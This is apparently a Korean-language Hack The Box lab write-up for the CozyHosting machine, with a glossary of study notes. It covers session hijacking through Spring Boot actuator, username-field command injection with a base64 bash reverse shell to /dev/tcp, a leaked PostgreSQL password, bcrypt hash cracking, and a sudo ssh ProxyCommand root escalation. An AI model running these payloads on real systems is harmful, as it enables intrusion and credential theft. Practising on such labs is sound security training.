# HTB-COZYHOSTING
```bash
OS: Linux
DATE: 26.09.28
DIFFICULTY: Easy
```

## RECON
**nmap**: 초기 정찰을 위해 전체 포트 검사 및 상세 포트 검사, UDP 포트 검사까지 실시했다.
```bash
nmap -p- -T4 IP
```
```bash
nmap -sC -sV -p 22,80 IP
```
```bash
sudo nmap -sUV --top-ports 100 IP
```
포트 검사 결과 22번 포트와 80(HTTP) 서비스가 실행 중인 것을 알게 되었다. 따라서 초기 접근을 위해 서비스에 접속한 결과 cozyhosting.htb라는 도메인으로 리다이렉트되었다. 따라서 이후 웹 디렉토리와 서브도메인 FUZZING을 진행했다.
```bash
ffuf -u http://cozyhosting.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -c -r
```
```bash
ffuf -u http://cozyhosting.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -c -r
```
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://cozyhosting.htb/ -H "Host: FUZZ.cozyhosting.htb" -fs 178
```
검사 결과 login 페이지와 admin 페이지, 그리고 error 페이지를 얻게 되었다. 하지만 admin은 403 상태 코드로 접속하지 못했고, error 페이지 또한 500 코드여서 접속하지 못했다.

## Initial Access
초기 접근을 위해 웹 서비스에 접속하여 정찰을 시도했다. 일단 Cozy Hosting이라는 이름의 웹 서비스였고 로그인 페이지만 접속 가능한 상태였다. 그리고 /error 페이지에 접속한 결과 **Whitelabel Error Page**라는 문구가 뜨면서 오류 페이지가 떴다. 이 문구를 구글에 검색한 결과 해당 웹 서비스는 **Spring Boot**라는 프레임워크로 돌아간다는 것을 알게 되었다. 프레임워크를 알게 된 후 바로 디버깅 엔드포인트를 찾아보았다. 구글에 검색한 결과 /actuator라는 Spring Boot 전용 디버그 엔드포인트 주소가 있었다. 하지만 개념을 잘 몰라 헤매고 있었고, Spring Boot 워드리스트를 찾고 그 워드리스트로 fuzzing을 하여 어떤 엔드포인트들이 있는지 확인할 수 있었다.
```bash
ffuf -u http://cozyhosting.htb/FUZZ -w ./spring-boot.txt -c -r 

actuator                [Status: 200, Size: 634, Words: 1, Lines: 1, Duration: 327ms]
actuator/health         [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 300ms]
actuator/env            [Status: 200, Size: 4957, Words: 120, Lines: 1, Duration: 292ms]
actuator/sessions       [Status: 200, Size: 95, Words: 1, Lines: 1, Duration: 247ms]
                        [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 307ms]
actuator/mappings       [Status: 200, Size: 9938, Words: 108, Lines: 1, Duration: 342ms]
actuator/beans          [Status: 200, Size: 127224, Words: 542, Lines: 1, Duration: 336ms]
```
가장 눈에 띄는 건 **actuator/sessions** 세션 엔드포인트 주소였다. 해당 엔드포인트에 접속해보니 **kanderson**이라는 유저의 세션 ID 같은 것이 있었다. 따라서 세션 하이재킹을 할 수 있다는 생각이 들었다. 하지만 내 세션과 kanderson이라는 유저의 세션을 바꾸려고 하니 내 브라우저 안에 나 자신의 세션조차 없었다. 알고 보니 세션 ID는 아무나 그냥 접속했다고 서버가 주는 것이 아니라, 세션을 만들 이유가 생겼을 때 주는 것이었다. 즉 로그인을 시도할 때 성공이든 실패든 나한테 세션을 만들어줄 이유가 생기기에, 아무거나 로그인을 한 순간 나의 세션이 만들어졌다. 따라서 바로 kanderson 유저의 세션 하이재킹에 성공했다. 세션 하이재킹 성공 후 바로 /admin 페이지로 리다이렉트되었다. 페이지 안에는 admin 대시보드와 cozy scanner이라는 기능이 있었다.

![scanner](attach_real/Pasted%20image%2020260929190438.png)

cozy scanner은 내가 관리하고 싶은 서버의 주소와 접속 계정을 입력하면 cozy scanner이라는 서비스가 그 정보로 대상 서버에 SSH 접속을 시도한다. 즉 이 기능은 서버 뒤에서 실제로 SSH 명령을 실행하는 기능이었다. 즉 이런 형태다.
```bash
ssh <입력한_username>@<입력한_hostname>
```
이런 명령어는 쉘에 그대로 시키기 때문에 커맨드 인젝션 취약점이 있을 수 있다. 따라서 hostname과 username 폼에 아무것이나 치고 `; id`를 시도해본 결과, hostname 폼에는 아무 호스트나 넣으면 Invalid Host라고 뜨기 때문에 hostname 폼에는 localhost만 적어주고 username 폼으로 갔다. username 폼에서는 test; id로 시도한 결과 아까처럼 Invalid Host라고 뜨지는 않지만 주소창에 `http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname ttjtj: Temporary failure in name resolution/bin/bash: line 1: whoami@10.10.14.23: command not found`이런 문구가 떴다. 따라서 username 폼에 커맨드 인젝션 가능성을 보고 여러 가지 페이로드를 실행해보았다.
더 편한 접근을 위해 Burp Suite로 캡처하여 시도했다. 시도한 결과 `` `id` ``라는 페이로드가 먹힌다는 것을 알 수 있었다. 바로 여러 가지를 실행해보았다. `ls -al` 이런 형식으로 Burp Suite로 접근한 결과 **Username can't contain whitespaces!**라는 문구가 떴다. 즉 공백을 무언가로 채워야 했다. 따라서 `+`와 같은 URL 인코딩 공백을 시도했지만 똑같이 불가능했다. 따라서 쉘 안에서 공백을 없애주는 명령어인 **${IFS}**를 사용한 결과 성공했다. 바로 쉘을 얻기 위해 bash reverse 쉘을 시도하려 했지만, 따옴표와 같은 복잡한 인자들이 많기에 페이로드를 base64로 인코딩하고 커맨드 인젝션 명령어에서 디코딩한 후 쉘로 오는 최종 페이로드를 작성했다.
```bash
echo "bash -c 'exec bash -i &>/dev/tcp/IP/4444 <&1'" | base64

fhdahfjdjfkjkkjkdsjafkdsajkfjdk==
```
이후 이것을 이용하여 최종 페이로드를 만들었다.
```bash
username=test;`echo${IFS}fhdahfjdjfkjkkjkdsjafkds+a+jkfjdk|base64${IFS}-d|bash`
```
이렇게 바로 시도했지만 **Username can't contain whitespaces!**라는 문구가 계속 나왔다. 어떤 문제가 있었냐면, 이건 raw 형태, 즉 그대로 터미널에 직접 타이핑하는 경우였다. 하지만 Burp Suite를 사용했기 때문에 URL 인코딩까지 진행해줘야 쉘이 오는 것이었다. 따라서 `;`을 `%3b`로 바꿔주고 `+`를 `%2B`로 바꿔준 결과 app이라는 쉘을 얻을 수 있었다.

![app](attach_real/Pasted%20image%2020260929194038.png)

쉘을 얻고 /app 디렉토리를 확인한 결과 **cloudhosting-0.0.1.jar**이라는 jar 파일을 얻게 되었다. 따라서 이 jar 파일을 로컬로 옮겨주었다.
```bash
(target)

python3 -m http.server 1111
```
```bash
(Kali)

wget http://IP:1111/cloudhosting-0.0.1.jar
```
따라서 파일을 얻은 후 unzip을 시도했다.
```bash
unzip cloudhosting-0.0.1.jar -d jar
```
이후 여러 폴더들과 파일들을 확인해본 결과 `jar/BOOT-INF/classes` 위치에 **application.properties**라는 파일이 있었다. 파일에는 **POSTGRESQL** 정보들이 담긴 내용이었다.
```bash
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```
따라서 psql을 사용하여 내부 쉘에서 접속했다.
```bash
psql -h localhost -U postgres

#
```
접속 후 \l로 데이터베이스 목록을 확인한 후 \c dbname으로 해당 DB로 전환해주었다.
```bash
postgres=# \l
                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-------------+----------+----------+-------------+-------------+-----------------------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres

postgres=# \c postgres
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "postgres" as user "postgres".
```
이후 \dt 명령어로 현재 DB의 테이블 목록을 확인한 후 출력해주었다.
```bash
postgres=# \c cozyhosting
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "cozyhosting" as user "postgres".
cozyhosting=# \dt
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres

cozyhosting=# SELECT * FROM users;
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```
이렇게 admin과 kanderson이라는 유저의 패스워드 해시를 얻게 되었다. 두 해시를 hash.txt에 넣어준 후 $2a는 bcrypt 해시이기 때문에 hashcat mode 3200으로 돌려주었다.
```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```
크랙 결과 admin 평문 비밀번호를 얻게 되었다. 이 비밀번호로 아까 쉘에서 cat /etc/passwd로 확인한 josh라는 유저로 SSH 접속을 시도한 결과 유저 쉘을 얻을 수 있었다.

![user](attach_real/Pasted%20image%2020260929161706.png)

## Privilege Escalation
처음 유저 쉘에 접속하자마자 sudo -l 명령어를 시도해보았다.
```bash
sudo -l
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```
확인한 결과 root 권한으로 SSH를 실행할 수 있다는 것을 알게 되었다. 따라서 GTFOBins에서 SSH 권한 상승을 확인한 결과 `ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x`라는 명령어로 권한 상승이 가능했다. 따라서 sudo를 앞에 붙여 명령어를 실행해주었다.
```bash
sudo ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
실행한 결과 루트 쉘을 얻을 수 있었다.

![root](attach_real/Pasted%20image%2020260929162714.png)

## New Inform
- 오류 페이지 등을 통해 어떤 프레임워크인지 알 수 있다.
- 프레임워크: 프로그램을 만들 때 매번 처음부터 다 짜지 않도록 미리 만들어진 뼈대와 부품 세트.
- Spring Boot: 자바 언어용 웹 프레임워크. Django: Python 전용. Laravel: PHP 용. Express: 자바스크립트 용.
- 엔드포인트: 서버에 접근할 수 있는 주소.
- 디버깅: 개발자가 프로그램의 오류를 찾고 내부 상태를 들여다보는 작업.
- 프레임워크를 알게 되면 디버그 엔드포인트를 찾아보고, 그에 맞는 워드리스트도 찾아보자.
- 세션 하이재킹: 내 세션과 상대 세션 교체.
- 세션 ID가 만들어지는 조건: 세션 쿠키는 서버가 발급해줘야 생긴다. 즉, 아무나 그냥 접속했다고 주지 않기 때문에 세션을 만들 이유가 생겼을 때 만든다. 대표적으로 로그인을 시도할 때(성공이든 실패든), 세션에 뭔가 저장할 일이 생겼을 때 서버가 세션 쿠키를 제공해준다.
- 공격을 시도하기 전 어떤 기능을 하는지부터 확인하자.
- 커맨드 인젝션이 의심되면 여러 가지 페이로드를 사용해본다. ex) `; id`, `| id`, `|| id`, `` `id` ``, `' ; id ; '` 등 여러 가지 시도하고 주의 깊게 관찰한다.
- 공백 문제가 있을 때 쉘 안에서 작동하는 ${IFS}와 같은 명령어를 사용한다.
- `+`는 공백의 URL 인코딩.
- 꼭 URL로 보내는 것은 URL 인코딩을 진행해줘야 한다.
- jar: 본질은 zip. 안에 든 것은 컴파일된 자바 바이트코드들이다.
- postgresql: 오픈 소스 관계형 데이터베이스.
- psql: 포스트그레스 명령어. ex) `psql -h <HOST> -U <user>`
- psql 기본 명령어: 
```bash
\l           목록: 모든 데이터베이스
\du          목록: 모든 롤(사용자)과 권한
\c dbname    해당 DB로 전환(connect)
\dt          현재 DB의 테이블 목록
\d 테이블명   테이블 구조 보기
\pset pager off   긴 출력이 pager에 안 갇히게
\q           나가기
```
- 해시를 얻으면 꼭 admin 해시도 크랙을 시도해볼 것.